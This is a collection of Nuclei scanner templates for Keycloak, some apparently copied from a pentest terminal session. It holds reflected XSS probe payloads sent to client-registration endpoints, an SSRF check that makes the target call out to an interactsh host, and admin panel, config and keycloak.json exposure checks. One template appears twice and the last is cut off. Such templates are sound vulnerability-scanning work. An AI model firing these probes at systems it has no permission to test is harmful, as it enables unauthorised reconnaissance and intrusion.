id: CVE-2021-20323

info:
  name: Keycloak 10.0.0 - 18.0.0 - Cross-Site Scripting
  author: ndmalc
  severity: medium
  description: |
    Keycloak 10.0.0 to 18.0.0 contains a cross-site scripting vulnerability via the client-registrations endpoint. On a POST request, the application does not sanitize an unknown attribute name before including it in the error response with a 'Content-Type' of text/hml. Once reflected, the response is interpreted as HTML. This can be performed on any realm present on the Keycloak instance. Since the bug requires Content-Type application/json and is submitted via a POST, there is no common path to exploit that has a user impact.
  reference:
    - https://github.com/keycloak/keycloak/security/advisories/GHSA-m98g-63qj-fp8j
    - https://bugzilla.redhat.com/show_bug.cgi?id=2013577
    - https://access.redhat.com/security/cve/CVE-2021-20323
    - https://github.com/ndmalc/CVE-2021-20323
    - https://github.com/keycloak/keycloak/commit/3aa3db16eac9b9ed8c5335ac86f5f50e0c68662d
    - https://nvd.nist.gov/vuln/detail/CVE-2021-20323
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2021-20323
    cwe-id: CWE-79
  metadata:
    shodan-query: html:"Keycloak"
    verified: "true"
  tags: cve,cve2021,keycloak,xss

requests:
  - method: POST
    path:
      - "{{BaseURL}}/auth/realms/master/clients-registrations/default"
      - "{{BaseURL}}/auth/realms/master/clients-registrations/openid-connect"
      - "{{BaseURL}}/realms/master/clients-registrations/default"
      - "{{BaseURL}}/realms/master/clients-registrations/openid-connect"

    headers:
      Content-Type: application/json

    body: "{\"Test<img src=x onerror=alert(document.domain)>\":1}"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'Unrecognized field "Test<img src=x onerror=alert(document.domain)>'

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 400




*******************


id: keycloak-xss

info:
  name: Keycloak <=8.0 - Cross-Site Scripting
  author: incogbyte
  severity: info
  description: Keycloak 8.0 and prior contains a cross-site scripting vulnerability.  An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.
  reference:
    - https://cure53.de/pentest-report_keycloak.pdf
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  tags: keycloak,xss

requests:
  - raw:
      - |
        POST /auth/realms/master/clients-registrations/openid-connect HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"<img onerror=confirm(1337) src/>":1}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 400

      - type: word
        words:
          - 'Unrecognized field "<img onerror=confirm(1337) src/>"'


**************************************

id: CVE-2020-10770

info:
  name: Keycloak 12.0.1 - request_uri  Blind Server-Side Request Forgery (SSRF)
  author: dhiyaneshDk
  severity: medium
  description: Keycloak 12.0.1 and below allow an attacker to force the server to request an unverified URL using the OIDC parameter request_uri. This allows an attacker to execute a server-side request forgery (SSRF) attack.
  reference:
    - https://packetstormsecurity.com/files/164499/Keycloak-12.0.1-Server-Side-Request-Forgery.html
    - https://www.exploit-db.com/exploits/50405
    - https://nvd.nist.gov/vuln/detail/CVE-2020-10770
    - https://bugzilla.redhat.com/show_bug.cgi?id=1846270
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
    cvss-score: 5.3
    cve-id: CVE-2020-10770
    cwe-id: CWE-601
  tags: keycloak,ssrf,oast,cve,cve2020,blind,packetstorm,edb

requests:
  - method: GET
    path:
      - '{{BaseURL}}/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://{{interactsh-url}}/'

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the HTTP Interaction
        words:
          - "http"


********************************************

root@pentest:~/nuclei-templates# cat exposed-panels/key-cloak-admin-panel.yaml
id: key-cloak-admin-panel

info:
  name: Keycloak Admin Login Panel - Detect
  author: incogbyte,righettod,daffainfo
  severity: info
  description: Keycloak admin login panel was detected.
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N
    cvss-score: 0.0
    cwe-id: CWE-200
  metadata:
    verified: true
    shodan-query: http.favicon.hash:-1105083093
  tags: panel,keycloak

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}/auth/admin"
      - "{{BaseURL}}/auth/admin/master/console/"

    stop-at-first-match: true
    host-redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<span>Keycloak</span>"
          - "alt=\"Keycloak"
          - "kc-form-buttons"
          - "/keycloak/img/favicon.ico"
        condition: or

      - type: status
        status:
          - 200


************************************************************


# cat exposures/configs/keycloak-openid-config.yaml
id: keycloak-openid-config

info:
  name: Keycloak openid-config
  author: rodnt
  severity: info
  reference:
    - https://issues.jboss.org/browse/KEYCLOAK-571
  tags: keycloak,config

requests:
  - method: GET
    path:
      - "{{BaseURL}}/.well-known/openid-configuration"
      - "{{BaseURL}}/auth/realms/master/.well-known/openid-configuration"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - 'issuer'
          - 'authorization_endpoint'
          - 'token_endpoint'
          - 'userinfo_endpoint'
          - 'jwks_uri'


*******************************************************


# cat workflows/keycloak-workflow.yaml
id: keycloak-workflow

info:
  name: Keycloak Security Checks
  author: daffainfo
  description: A simple workflow that runs all Keycloak related nuclei templates on a given target.

workflows:
  - template: exposed-panels/key-cloak-admin-panel.yaml
    subtemplates:
      - tags: keycloak
root@pentest:~/nuclei-templates# cat vulnerabilities/other/keycloak-xss.yaml
id: keycloak-xss

info:
  name: Keycloak <=8.0 - Cross-Site Scripting
  author: incogbyte
  severity: info
  description: Keycloak 8.0 and prior contains a cross-site scripting vulnerability.  An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.
  reference:
    - https://cure53.de/pentest-report_keycloak.pdf
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  tags: keycloak,xss

requests:
  - raw:
      - |
        POST /auth/realms/master/clients-registrations/openid-connect HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"<img onerror=confirm(1337) src/>":1}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 400

      - type: word
        words:
          - 'Unrecognized field "<img onerror=confirm(1337) src/>"'

# Enhanced by mp on 2022/09/23


******************************************************************


s# cat exposures/files/keycloak-json.yaml
id: keycloak-json

info:
  name: Keycloak Json File
  author: oppsec
  severity: info
  tags: exposure,keycloak,config,files

requests:
  - method: GET
    path:
      - "{{BaseURL}}/keycloak.json"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - realm
          - resource
          - auth-server-url
        condition: and

      - type: status
        status:


*************************************************
